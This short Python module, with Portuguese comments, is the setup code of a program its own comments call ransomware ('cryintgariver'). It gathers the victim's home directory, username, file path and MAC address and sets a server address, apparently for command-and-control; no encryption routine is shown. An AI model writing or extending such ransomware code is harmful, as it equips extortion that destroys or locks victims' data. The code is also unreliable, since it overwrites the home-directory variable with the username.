#!/usr/bin/env python
# _*_coding: UTF-8

from getters import Getters

get = Getters()

# Nome do ransomware
_name = ("cryintgariver")
# recupero o diretório home do usuário
_home = get.get_home()
# Recupera o nome de usuário registrado no sistema
_home = get.get_username()
#Recupera o caminho do arquivo até o diretório do script
_ransomware_path = get.get_path(_home, _name)
# Endereço do server
_server_addr = ("http://localhost:8000")
# Endereço de máquino
_mac_id = get.get_MAC()